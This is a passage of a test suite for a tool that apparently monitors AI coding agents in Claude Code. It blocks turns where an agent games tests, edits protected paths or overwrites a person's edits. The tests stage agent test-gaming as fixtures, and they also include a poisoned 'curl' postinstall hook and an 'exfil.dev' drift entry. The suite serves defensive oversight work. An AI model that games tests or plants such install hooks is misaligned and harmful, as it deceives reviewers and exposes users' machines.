  const head8 = () => execFileSync('git', ['-C', d, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim().slice(0, 8);
  return { d, g, honest, hook, turn, rec, feed, head8 };
};

test('turn --hook under user-level wiring resolves the repository root from a subdirectory (the baseline lands where the Stop hook reads it)', () => {
  const { d, g } = wallRepo(['src/auth/login.js']);
  try {
    const sub = join(d, 'pkg'); mkdirSync(sub);
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'person\n');            // the person's own edit, before the prompt
    execFileSync(process.execPath, [CLI, 'turn', '--hook'], { cwd: sub, input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    assert.ok(!existsSync(join(sub, '.sawbuck')), 'nothing written in the subdirectory');
    const st = JSON.parse(readFileSync(join(d, '.sawbuck', 'state.json'), 'utf8'));
    assert.ok('src/auth/login.js' in st.turnBaseline.files, 'the baseline is at the root and spares the person\'s edit');
    const out = execFileSync(process.execPath, [HOOKF, '--by', 'claude', '--stop'], { cwd: sub, input: '{}', encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME, LOGBOOK_NO_CACHE: '1' } });
    assert.ok(!/"decision":"block"/.test(out), 'the user-level Stop hook from the subdirectory sees the baseline: a clean turn ends');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the gamed wall\'s block budget is per prompt without prompt_id even in a repo with no mandates', () => {
  const { d, g, honest, hook, turn } = gamedRepo(false);
  try {
    hook({});                                                                // arm on the base commit
    turn();                                                                  // the prompt begins; what the agent commits from here is the turn's
    writeFileSync(join(d, 'calc.test.mjs'), honest.replace('2));', '8));')); g('commit', '-q', '-am', 'make it green');
    for (let i = 0; i < 3; i++) assert.equal(JSON.parse(hook({})).decision, 'block');
    assert.match(JSON.parse(hook({})).systemMessage || '', /stopped blocking/, 'the budget for this prompt is spent');
    turn();                                                                  // the next prompt: a later turn is told about it, not sent back (0.2.0)
    const later = JSON.parse(hook({}));
    assert.notEqual(later.decision, 'block', 'a later turn is not sent back for an earlier turn\'s catch');
    assert.match(later.systemMessage || '', /from an earlier turn is still open: calc\.test\.mjs/);
    // a catch of its own in a later turn gets a budget of its own: the key is the prompt, not the repo's lifetime
    writeFileSync(join(d, 'calc.test.mjs'), honest); g('commit', '-q', '-am', 'the person puts the test back');   // between turns: theirs
    turn();
    writeFileSync(join(d, 'calc.test.mjs'), honest.replace('2));', '8));')); g('commit', '-q', '-am', 'make it green again');
    for (let i = 0; i < 3; i++) assert.equal(JSON.parse(hook({})).decision, 'block', 'a fresh budget for a new prompt');
    assert.match(JSON.parse(hook({})).systemMessage || '', /stopped blocking/);
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a standing gamed verdict holds through an inconclusive span, a regression on top, and the person\'s own commit, and clears only on the real fix', () => {
  const { d, g, honest, hook, rec, feed, head8 } = gamedRepo(true);
  try {
    hook({ prompt_id: 'p0' });
    writeFileSync(join(d, 'calc.test.mjs'), honest.replace('2));', '8));')); g('commit', '-q', '-am', 'make it green');
    let r = JSON.parse(hook({ prompt_id: 'p1' })); assert.equal(r.decision, 'block'); assert.match(r.reason, /gamed/);
    const original = rec().latest; assert.equal(original.kind, 'gamed');
    // (b) a follow-up that makes the gate unmeasurable: the test file no longer parses
    writeFileSync(join(d, 'calc.test.mjs'), 'this is not javascript (\n'); g('commit', '-q', '-am', 'break the test');
    r = JSON.parse(hook({ prompt_id: 'p2' }));
    assert.equal(r.decision, 'block', 'an inconclusive re-proof does not let the turn end');
    assert.equal(rec().latest.kind, 'gamed'); assert.equal(rec().latest.sha, head8(), 'the record follows HEAD');
    assert.equal(feed().at(-1).kind, 'inconclusive'); assert.equal(feed().at(-1).again, true);
    // (a) a follow-up that regresses a guard on top of the cheat: fail does not outrank the standing verdict
    writeFileSync(join(d, 'calc.test.mjs'), honest.replace('2));', '8));')); writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b; // BUG TODO\n'); g('commit', '-q', '-am', 'cheat back + a todo');
    r = JSON.parse(hook({ prompt_id: 'p3' }));
    assert.equal(r.decision, 'block', 'a regression over the gamed span keeps the wall up');
    assert.equal(rec().latest.kind, 'gamed', 'the record is not rewritten to a regression');
    assert.equal(feed().at(-1).kind, 'gamed', 'the feed says gamed for a gamed win under the engine\'s "fail" (0.1.73; it said regression)'); assert.equal(feed().at(-1).again, true);
    assert.equal(rec().gamed, 1, 'the standing catch is never counted twice'); assert.equal(rec().regressions, 0, 'and the regression over the same span is not a new catch');
    // (c) the person's unrelated commit between turns: the record's file and attribution do not move
    writeFileSync(join(d, 'app.js'), 'export const n = 1;\n'); g('add', '-A'); g('commit', '-q', '-m', 'person: app.js');
    r = JSON.parse(hook({ prompt_id: 'p4' })); assert.equal(r.decision, 'block');
    assert.equal(rec().latest.file, original.file, 'the file the block names is the original catch');
    assert.equal(rec().latest.by, original.by);
    assert.match(r.reason, new RegExp(`the win on ${original.file.replace('.', '\\.')} was gamed`));
    // (d) the real fix over the whole span clears it
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); writeFileSync(join(d, 'calc.test.mjs'), honest); g('commit', '-q', '-am', 'fix sub in source');
    const out = hook({ prompt_id: 'p5' });
    assert.ok(!/"decision":"block"/.test(out), 'the real fix clears the wall');
    assert.equal(rec().latest.kind, 'verified');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a commit landed between turns does not walk the agent\'s committed protected change through while HEAD still carries it', () => {
  const { d, g, hook, turn, state } = wallRepo(['src/auth/login.js']);
  try {
    const base = execFileSync('git', ['-C', d, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
    turn();
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n'); g('add', 'src/auth/login.js'); g('commit', '-q', '-m', 'auth change (mid-turn)');
    { const r1 = JSON.parse(hook({ prompt_id: 'p1' })); assert.equal(r1.decision, 'block'); assert.match(r1.reason, /To accept this change on purpose, change the rule in the contract or revert the path/); }
    assert.match(JSON.parse(hook({ prompt_id: 'p1' })).systemMessage || '', /not sent back again/);
    g('commit', '-q', '--allow-empty', '-m', 'tidy (a background process the agent started)');   // HEAD moves after the Stop
    turn();
    assert.equal(state().turnBaseline.sha, base, 'the pin holds: HEAD still carries the flagged content');
    const r = JSON.parse(hook({ prompt_id: 'p2' }));
    assert.equal(r.decision, undefined, 'the committed protected change is still on the wall: told, not sent back again (0.2.9)');
    assert.match(r.systemMessage || '', /protected paths are still changed/);
    // the person reverts the path and commits: the pin is released and a clean turn ends
    g('checkout', base, '--', 'src/auth/login.js'); g('commit', '-q', '-am', 'person: revert the auth change');
    const head = execFileSync('git', ['-C', d, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
    turn();
    assert.equal(state().turnBaseline.sha, head, 'the baseline starts at the person\'s commit once the flagged content is gone');
    assert.ok(!/"decision":"block"/.test(hook({ prompt_id: 'p3' })));
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the person narrowing the mandate in a committed contract change between turns lifts the pin', () => {
  const { d, g, hook, turn } = wallRepo(['src/auth/login.js']);
  try {
    turn();
    writeFileSync(join(d, 'src', 'auth', 'login.js'), 'agent\n'); g('add', 'src/auth/login.js'); g('commit', '-q', '-m', 'auth change (mid-turn)');
    for (let i = 0; i < 4; i++) hook({ prompt_id: 'p1' });
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'no-auth', paths: ['src/auth/admin/**'] }], metrics: [] }));
    g('commit', '-q', '-am', 'person: the rule covers admin only now');
    turn();
    assert.ok(!/"decision":"block"/.test(hook({ prompt_id: 'p2' })), 'both the working and the committed contract leave login.js unprotected');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('a standing gamed verdict whose base left the clone is cleared out loud and new commits are checked again', () => {
  const { d, g, hook, rec, feed } = gamedRepo(false);
  try {
    hook({ prompt_id: 'p0' });                                               // arm (lastSha = base)
    mkdirSync(join(d, '.sawbuck'), { recursive: true });
    writeFileSync(join(d, '.sawbuck', 'results.json'), JSON.stringify({ regressions: 0, gamed: 1, latest: { kind: 'gamed', sha: 'deadbeef', base: '0'.repeat(40), file: 'calc.mjs', reason: 'x', at: '2026-11-01T00:00:00Z', by: 'claude' } }));
    writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a - b;\n'); g('commit', '-q', '-am', 'fix sub in source');
    const out = hook({ prompt_id: 'p1' });
    assert.ok(!/"decision":"block"/.test(out), 'an unverifiable record never blocks');
    assert.equal(rec().latest.kind, 'unverified');
    const kinds = feed().map((e) => e.kind);
    assert.ok(kinds.includes('note'), 'the loss of the base is in the feed');
    assert.equal(kinds.at(-1), 'verified', 'the new commit was checked from the last commit seen');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('the block names how to restore a person\'s edit the agent overwrote, and the restored file reads as theirs in the next prompt too', () => {
  const { d, g, hook, turn, state } = wallRepo(['src/auth/old.js']);
  try {
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'my wip, line one\nline two\n');   // the person's edit before the prompt
    const h0 = execFileSync('git', ['-C', d, 'hash-object', '--', 'src/auth/old.js'], { encoding: 'utf8' }).trim();
    turn();
    writeFileSync(join(d, 'src', 'auth', 'old.js'), 'agent clobbered it\n');
    const r = JSON.parse(hook({ prompt_id: 'p1' }));
    assert.equal(r.decision, 'block');
    const cmd = `git cat-file -p ${h0} > src/auth/old.js`;
    assert.ok(r.reason.includes(`restore src/auth/old.js to the content it had when the prompt began: ${cmd}`), 'the restore is named by hash');
    assert.deepEqual(state().lastViolation.before, { 'src/auth/old.js': h0 });
    for (let i = 0; i < 3; i++) hook({ prompt_id: 'p1' });                   // the budget runs out with the file still clobbered
    turn();                                                                  // the next prompt: the baseline says old.js is the person's at h0
    assert.equal(state().turnBaseline.files['src/auth/old.js'], h0);
    execFileSync('sh', ['-c', cmd], { cwd: d });                             // the agent runs the named restore
    assert.equal(readFileSync(join(d, 'src', 'auth', 'old.js'), 'utf8'), 'my wip, line one\nline two\n', 'restored byte for byte');
    assert.ok(!/"decision":"block"/.test(hook({ prompt_id: 'p2' })), 'the restored file is the person\'s again: the turn ends');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('supply chain: the Action runs this exact release and the engines are pinned exactly', () => {
  const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
  const action = readFileSync(new URL('../action.yml', import.meta.url), 'utf8');
  assert.match(action, new RegExp('npx -y sawbuck@' + pkg.version.replace(/\./g, '\\.') + ' '), 'action.yml pins the package version');
  for (const [name, range] of Object.entries(pkg.dependencies)) assert.match(range, /^\d+\.\d+\.\d+$/, name + ' is an exact version');
});

test('the lock at turn level: a change of structure is told to the person once, and never blocks', () => {
  const d = mkdtempSync(join(tmpdir(), 'sb-lock-'));
  const g = (...a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g('init', '-q'); g('config', 'user.email', 'a@b.c'); g('config', 'user.name', 'a');
  mkdirSync(join(d, '.promptwheel/packs/supply-chain'), { recursive: true });
  // a stand-in for the pack: reads the drift list and pins from plain files, so this test holds the wiring
  writeFileSync(join(d, '.promptwheel/packs/supply-chain/lock.mjs'), "import { readFileSync } from 'node:fs';\nconst a = process.argv[2];\nprocess.stdout.write(readFileSync(a === 'pins' ? 'pins.txt' : 'drift.json', 'utf8'));\n");
  writeFileSync(join(d, 'promptwheel.lock.json'), '{}\n'); writeFileSync(join(d, 'drift.json'), '[]'); writeFileSync(join(d, 'pins.txt'), '1');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ mandates: [{ name: 'm', paths: ['frozen/**'] }], metrics: [{ name: 'x', cmd: 'true', extract: 'exit', direction: 'pass' }] }));
  g('add', '-A'); g('commit', '-qm', 'base');
  const SB = fileURLToPath(new URL('../sawbuck.mjs', import.meta.url));
  const HK = fileURLToPath(new URL('../sawbuck-hook.mjs', import.meta.url));
  execFileSync(process.execPath, [SB, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8' });
  const stop = () => execFileSync(process.execPath, [HK, '--repo', d, '--stop'], { input: JSON.stringify({ prompt_id: 'p' }), encoding: 'utf8' });
  assert.equal(stop().includes('changed what the lock holds'), false, 'nothing changed, nothing said');
  writeFileSync(join(d, 'drift.json'), '["dep:evil","host:exfil.dev"]');
  const out = stop();
  assert.match(out, /dep:evil, host:exfil\.dev/);
  assert.doesNotMatch(out, /"decision"/, 'a notice, never a block');
  assert.equal(stop().includes('changed what the lock holds'), false, 'said once');
  writeFileSync(join(d, 'pins.txt'), '2');
  assert.match(stop(), /resolved dependency tree/);
});

test('the wall survives a shell with no node on PATH (hooks run under sh, which does not load nvm)', () => {
  const d = mkdtempSync(join(tmpdir(), 'sb-nonode-'));
  const g = (...a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g('init', '-q'); g('config', 'user.email', 'a@b.c'); g('config', 'user.name', 'a');
  writeFileSync(join(d, 'a.txt'), 'a\n'); g('add', '-A'); g('commit', '-qm', 'base');
  const SB = fileURLToPath(new URL('../sawbuck.mjs', import.meta.url));
  execFileSync(process.execPath, [SB, 'attach', '--claude', d], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], cwd: d, env: { ...process.env, HOME: TMP_HOME } });
  const cfg = JSON.parse(readFileSync(join(d, '.claude/settings.local.json'), 'utf8'));
  const cmd = cfg.hooks.Stop[0].hooks[0].command;
  const r = spawnSync('/bin/sh', ['-c', cmd], { env: { PATH: '/usr/bin:/bin', HOME: TMP_HOME }, input: JSON.stringify({ prompt_id: 'p' }), encoding: 'utf8' });
  if (!/\/usr\/bin\/node|\/bin\/node/.test(execFileSync('sh', ['-c', 'PATH=/usr/bin:/bin command -v node || true'], { encoding: 'utf8' }))) assert.doesNotMatch(r.stderr, /not found/);
  assert.equal(r.status, 0, r.stderr);
});

test('sawbuck contract signs a repo: tests stay, protections and the lock land, the scanners reach git, and it fails a poisoned change', () => {
  const d = mkdtempSync(join(tmpdir(), 'sb-contract-'));
  const g = (...a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g('init', '-q'); g('config', 'user.email', 'a@b.c'); g('config', 'user.name', 'a');
  mkdirSync(join(d, 'src/auth'), { recursive: true }); writeFileSync(join(d, 'src/auth/a.js'), 'export const a = 1;\n');
  // an example app's auth folder is not product code: express has examples/auth, and signing suggested protecting it
  mkdirSync(join(d, 'examples/auth'), { recursive: true }); writeFileSync(join(d, 'examples/auth/index.js'), 'export const demo = 1;\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'r', type: 'module', scripts: { test: 'node -e 0' } }));
  g('add', '-A'); g('commit', '-qm', 'base');
  const SB = fileURLToPath(new URL('../sawbuck.mjs', import.meta.url));
  const sb = (...a) => execFileSync(process.execPath, [SB, ...a], { cwd: d, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  assert.equal(existsSync(join(d, 'promptwheel.config.json')), false);
  assert.match(sb('contract', '--full', '--dry-run'), /would write/);
  assert.equal(existsSync(join(d, 'promptwheel.config.json')), false, 'a dry run writes nothing');
  const out = sb('contract', '--full');
  assert.match(out, /signed/); assert.match(out, /src\/auth\/\*\*/, 'auth is suggested'); assert.doesNotMatch(out, /examples\/auth/, 'an example folder is not');
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.ok(cfg.metrics.some((m) => m.name === 'lock_drift'), 'the lock guard');
  assert.ok(cfg.metrics.some((m) => /test/.test(m.cmd) && !m.cmd.includes('packs/')), 'the test metric stays: the preset alone would drop the gamed check');
  assert.ok(cfg.mandates.some((m) => m.name === 'workflows-frozen')); assert.ok(!cfg.mandates.some((m) => m.paths.some((p) => p.includes('auth'))), 'product code is never frozen for you');
  assert.equal(cfg.allowTrailer, false); assert.ok(existsSync(join(d, 'promptwheel.lock.json')));
  const again = readFileSync(join(d, 'promptwheel.config.json'), 'utf8');
  assert.match(sb('contract', '--full'), /already signed/); assert.equal(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'), again, 'running it twice changes nothing');
  sb('attach', '.');
  g('add', '-A'); g('commit', '-qm', 'sign');
  assert.ok(execFileSync('git', ['ls-files', '.promptwheel/packs'], { cwd: d, encoding: 'utf8' }).includes('lock.mjs'), 'the scanners are tracked even after attach: the gate runs in clean worktrees');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'r', type: 'module', scripts: { test: 'node -e 0', postinstall: 'curl x' } }));
  const r = spawnSync(process.execPath, [SB, 'check', '--json'], { cwd: d, encoding: 'utf8' });
  assert.notEqual(r.status, 0, 'a poisoned change fails the signed contract'); 
});

test('a turn that signs a contract is not blocked by it, and a rule held at turn start still blocks', () => {
  const d = mkdtempSync(join(tmpdir(), 'sb-signturn-'));
  const g = (...a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g('init', '-q'); g('config', 'user.email', 'a@b.c'); g('config', 'user.name', 'a');
  writeFileSync(join(d, 'a.txt'), 'a\n'); g('add', '-A'); g('commit', '-qm', 'base');
  const SB = fileURLToPath(new URL('../sawbuck.mjs', import.meta.url)), HK = fileURLToPath(new URL('../sawbuck-hook.mjs', import.meta.url));
  const prompt = () => execFileSync(process.execPath, [SB, 'turn', '--hook', d], { input: JSON.stringify({ hook_event_name: 'UserPromptSubmit' }), encoding: 'utf8' });
  const stop = (id) => execFileSync(process.execPath, [HK, '--repo', d, '--stop'], { input: JSON.stringify({ prompt_id: id }), encoding: 'utf8' });
  const cfg = { mandates: [{ name: 'frozen', paths: ['frozen/**'] }], metrics: [{ name: 'x', cmd: 'true', extract: 'exit', direction: 'pass' }] };
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: cfg.metrics })); g('add', '-A'); g('commit', '-qm', 'contract with no rule yet');
  prompt();
  mkdirSync(join(d, 'frozen')); writeFileSync(join(d, 'frozen/x.txt'), 'x\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  assert.doesNotMatch(stop('p1'), /"decision":"block"/, 'the rule arrived in this turn');
  g('add', '-A'); g('commit', '-qm', 'sign');
  prompt();
  writeFileSync(join(d, 'frozen/x.txt'), 'changed\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: cfg.metrics }));
  assert.match(stop('p2'), /"decision":"block"/, 'a rule in force at turn start holds, even with the rule deleted in the turn');
});

test('sawbuck contract works in a repo already attached, and one that gitignores .promptwheel/', () => {
  const d = mkdtempSync(join(tmpdir(), 'sb-contract2-'));
  const g = (...a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g('init', '-q'); g('config', 'user.email', 'a@b.c'); g('config', 'user.name', 'a');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'r', type: 'module', scripts: { test: 'node -e 0' } }));
  writeFileSync(join(d, '.gitignore'), 'node_modules\n.promptwheel/\n'); g('add', '-A'); g('commit', '-qm', 'base');
  // an exclude block as an older attach wrote it
  writeFileSync(join(d, '.git/info/exclude'), '# >>> sawbuck >>>\n.sawbuck/\n.promptwheel/\n# <<< sawbuck <<<\n');
  const SB = fileURLToPath(new URL('../sawbuck.mjs', import.meta.url));
  execFileSync(process.execPath, [SB, 'contract', '--full'], { cwd: d, stdio: 'ignore' });
  g('add', '-A'); g('commit', '-qm', 'sign');
  assert.ok(execFileSync('git', ['ls-files', '.promptwheel/packs'], { cwd: d, encoding: 'utf8' }).includes('lock.mjs'), 'the scanners reach git');
  assert.ok(!execFileSync('git', ['ls-files'], { cwd: d, encoding: 'utf8' }).includes('outcomes'), 'the record stays out');
  const r = spawnSync(process.execPath, [SB, 'check', '--base', 'HEAD~1', '--head', 'HEAD', '--no-auto', '--json'], { cwd: d, encoding: 'utf8', env: process.env });
  assert.ok(!/null/.test(JSON.stringify(JSON.parse(r.stdout.slice(r.stdout.indexOf('{'))).metrics.filter((m) => m.name === 'lock_drift').map((m) => m.after))), 'the guard measures at head');
});

test('a signed repo with a clean tree does not block its own turn: the hook keeps settings.local.json excluded', () => {
  const home = mkdtempSync(join(tmpdir(), 'sawbuck-clean-home-'));
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-clean-'));
  const env = { HOME: home, XDG_CONFIG_HOME: join(home, 'cfg'), GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'a', GIT_AUTHOR_EMAIL: 'a@b.c', GIT_COMMITTER_NAME: 'a', GIT_COMMITTER_EMAIL: 'a@b.c' };
  const g = (...a) => execFileSync('git', a, { cwd: d, encoding: 'utf8', env: { ...process.env, ...env } });
  g('init', '-q'); writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { test: 'node -e 0' } })); g('add', '-A'); g('commit', '-qm', 'base');
  sawbuck(['contract', '--full'], d, env); g('add', '-A'); g('commit', '-qm', 'sign');
  sawbuck(['attach', '--claude'], d, env);
  const hook = (args, ev) => execFileSync(process.execPath, [CLI, ...args], { cwd: d, encoding: 'utf8', input: JSON.stringify({ hook_event_name: ev, cwd: d, session_id: 's', prompt: 'x' }), env: { ...process.env, ...env } });
  for (let i = 0; i < 2; i++) {
    hook(['turn', '--hook'], 'UserPromptSubmit');
    assert.ok(!hook(['__hook', '--by', 'claude', '--stop'], 'Stop').includes('"block"'), 'a clean turn is not blocked');
  }
  assert.equal(g('status', '--porcelain').trim(), '');
  assert.ok(readFileSync(join(d, '.git/info/exclude'), 'utf8').includes('.claude/settings.local.json'));
});

test('detach takes back the exclude block in a repo that was never attached', () => {
  const d = mkdtempSync(join(tmpdir(), 'sawbuck-noattach-'));
  try {
    execFileSync('git', ['init', '-q', d]);
    const xf = join(d, '.git', 'info', 'exclude');
    const before = readFileSync(xf, 'utf8');
    ensureExcluded(d);
    assert.match(readFileSync(xf, 'utf8'), /# >>> sawbuck >>>/);
    const out = sawbuck(['detach', '.'], d);
    assert.match(out, /removed the record lines/);
    assert.equal(readFileSync(xf, 'utf8'), before, 'exact inverse, byte for byte');
    assert.match(sawbuck(['detach', '.'], d), /nothing to detach/, 'and nothing left the second time');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

test('share: a finding goes once to each memory the person runs, as a titled memory or a note; nothing where none is', async () => {
  const { d } = tmpRepo();
  const home = mkdtempSync(join(tmpdir(), 'share-home-'));
  const got = [];
  const srv = createServer((req, res) => {
    let b = ''; req.on('data', (c) => { b += c; });
    req.on('end', () => { got.push({ url: req.url, body: b }); res.setHeader('content-type', 'application/json'); res.end(req.url === '/api/health' ? '{"status":"ok"}' : '{"id":1}'); });
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  // the fake worker lives in this process, so the command runs asynchronously (a synchronous spawn would block it)
  const run = (h, args) => new Promise((res) => execFile(process.execPath, [CLI, 'share', ...args], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: h } }, (err, stdout, stderr) => res({ code: err ? err.code : 0, stdout, stderr })));
  try {
    // nothing on this machine: every sink says why, nothing is written
    const none = await run(home, ['--title', 'x', 'y']);
    assert.equal(none.code, 0); assert.match(none.stderr, /claude-mem: no claude-mem/); assert.match(none.stderr, /auto-memory: Claude Code has no project directory/); assert.match(none.stderr, /markdown: no share\.markdown/); assert.equal(got.length, 0); assert.ok(!existsSync(join(d, '.sawbuck', 'shared.jsonl')));
    // claude-mem present (its port file names the worker), Claude Code has a project directory here, a Markdown folder is configured
    mkdirSync(join(home, '.claude-mem'), { recursive: true }); writeFileSync(join(home, '.claude-mem', '.worker.port'), String(srv.address().port));
    const proj = join(home, '.claude', 'projects', d.replace(/\//g, '-')); mkdirSync(proj, { recursive: true });
    writeFileSync(join(d, 'sawbuck.config.json'), JSON.stringify({ share: { markdown: 'notes/sawbuck' } }));
    const first = await run(home, ['--title', 'Reply in at most 3 lines.', 'keep your reply to three lines | three lines max']);
    assert.match(first.stdout, /shared "Reply in at most 3 lines\." with claude-mem \(http:\/\/127\.0\.0\.1:/, first.stderr);
    assert.match(first.stdout, /with auto-memory \(/); assert.match(first.stdout, /with markdown \(/);
    const save = got.find((g) => g.url === '/api/memory/save'); assert.ok(save, 'the save route was called');
    const body = JSON.parse(save.body); assert.equal(body.title, 'Reply in at most 3 lines.'); assert.match(body.text, /three lines max/); assert.equal(body.cwd, d);
    // the auto-memory note is in Claude Code's own form, with the index line it loads at session start
    const note = readFileSync(join(proj, 'memory', 'rule-reply-in-at-most-3-lines.md'), 'utf8');
    assert.match(note, /^---\nname: rule-reply-in-at-most-3-lines\ndescription: Reply in at most 3 lines\.\nmetadata:\n  type: feedback\n  source: sawbuck\n---/);
    assert.match(note, /\*\*Why:\*\* keep your reply to three lines/); assert.match(note, /\*\*How to apply:\*\* Hold to this/);
    assert.match(readFileSync(join(proj, 'memory', 'MEMORY.md'), 'utf8'), /- \[Reply in at most 3 lines\.\]\(rule-reply-in-at-most-3-lines\.md\) — rule, from Sawbuck/);
    // the Markdown folder got one file with front matter
    const md = readFileSync(join(d, 'notes', 'sawbuck', 'rule-reply-in-at-most-3-lines.md'), 'utf8'); assert.match(md, /^---\ntitle: Reply in at most 3 lines\.\nkind: rule\n/);
    assert.equal(readFileSync(join(d, '.sawbuck', 'shared.jsonl'), 'utf8').trim().split('\n').length, 3);
    // the same finding again: not sent anywhere twice; a revert names its files and lands with its own kind
    const again = await run(home, ['--title', 'Reply in at most 3 lines.', 'keep your reply to three lines | three lines max']);
    assert.match(again.stderr, /claude-mem: already shared/); assert.equal(got.filter((g) => g.url === '/api/memory/save').length, 1);
    const rev = await run(home, ['--title', 'reverted: cache: add an LRU limit', '--kind', 'revert', '--files', 'src/cache.js', '--to', 'auto-memory', 'It logged users out.']);
    assert.match(rev.stdout, /with auto-memory/); assert.ok(!/claude-mem/.test(rev.stdout));
    const rn = readFileSync(join(proj, 'memory', 'revert-reverted-cache-add-an-lru-limit.md'), 'utf8'); assert.match(rn, /Do not redo this change/); assert.match(rn, /Files: src\/cache\.js/);
    // rules --notes lists the notes Claude Code's own memory holds, leaving out the ones Sawbuck wrote
    writeFileSync(join(proj, 'memory', 'short-replies.md'), '---\nname: short-replies\ndescription: User wants replies kept to about three lines\nmetadata:\n  type: feedback\n---\n\nKeep replies to three lines.\n\n**Why:** User asked twice.\n');
    const notes = execFileSync(process.execPath, [CLI, 'rules', '--notes'], { cwd: d, encoding: 'utf8', env: { ...process.env, HOME: home } });
    assert.match(notes, /1 note in Claude Code's own memory/); assert.match(notes, /User wants replies kept to about three lines \[feedback\]/); assert.match(notes, /Keep replies to three lines\./); assert.ok(!/from Sawbuck|rule-reply/.test(notes));
  } finally { srv.close(); rmSync(d, { recursive: true, force: true }); rmSync(home, { recursive: true, force: true }); }
});

// ---- the strength for a repo where nobody stands at the merge (roadmap W16): the counts of the tests take a reason
// written in a commit of the change, and the reason is kept on the record. Protected paths still take a person's.
test('contract --say-why: a removed test passes when a commit says why, a plain contract still asks a person, and a second signing keeps the strength', () => {
  const PWBIN = ENGINE_BIN;   // found the way the product finds it: PW_BIN, then this checkout's node_modules, then the sibling
  const mk = (...flags) => {
    const { d, g } = tmpRepo();
    writeFileSync(join(d, 'package.json'), '{"name":"x","type":"module","scripts":{"test":"node --test"}}');
    mkdirSync(join(d, 'test')); writeFileSync(join(d, 'test/a.test.js'), "import test from 'node:test';\ntest('add', () => {});\ntest('sub', () => {});\n");
    g('add', '-A'); g('commit', '-qm', 'tests');
    const out = execFileSync(process.execPath, [CLI, 'contract', ...flags], { cwd: d, encoding: 'utf8' });
    g('add', '-A'); g('commit', '-qm', 'the contract');
    return { d, g, out };
  };
  const drop = ({ d, g }) => {
    writeFileSync(join(d, 'test/a.test.js'), "import test from 'node:test';\ntest('add', () => {});\n");
    g('commit', '-qam', 'drop the sub test\n\nSawbuck-Allow: test_count: the rule it checked went');
    const r = spawnSync(process.execPath, [PWBIN, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--no-record'], { cwd: d, encoding: 'utf8' });
    return { code: r.status, rep: JSON.parse(r.stdout) };
  };
  const a = mk('--say-why');
  assert.match(spawnSync(process.execPath, [CLI, 'contract', '--say-why'], { cwd: (() => { const d = mkdtempSync(join(tmpdir(), 'sw-')); spawnSync('git', ['init', '-q', '-b', 'main'], { cwd: d }); writeFileSync(join(d, 'package.json'), '{"scripts":{"test":"node --test"}}'); return d; })(), encoding: 'utf8' }).stdout, /<what was removed, and who asked for it>/, 'the hint asks for what the verdict asks for');
  try {
    assert.match(a.out, /A test may be removed where a commit of the change says why/);
    const cfg = JSON.parse(readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8'));
    assert.equal(cfg.allowTrailer, undefined); assert.equal(cfg.metrics.find((m) => m.name === 'test_count').allowable, true);
    assert.ok(cfg.mandates.every((m) => m.allowable !== true), 'a protected path still takes a person');
    const before = readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8');
    assert.match(execFileSync(process.execPath, [CLI, 'contract'], { cwd: a.d, encoding: 'utf8' }), /already signed/);
    assert.equal(readFileSync(join(a.d, 'promptwheel.config.json'), 'utf8'), before, 'a second signing with no switch does not take the strength away');
    const r = drop(a);
    assert.equal(r.code, 0, JSON.stringify(r.rep.allowed)); assert.match(r.rep.allowed.reason, /the rule it checked went/);
  } finally { rmSync(a.d, { recursive: true, force: true }); }
  const b = mk();
  try { assert.equal(drop(b).code, 1, 'the contract as it was: no reason from a commit'); } finally { rmSync(b.d, { recursive: true, force: true }); }
  // typed after the wave of 0.2.1 (2026-11-19): a repo signed plain, then --say-why. It changed the contract and said "nothing changed"
  const c = mk();
  try {
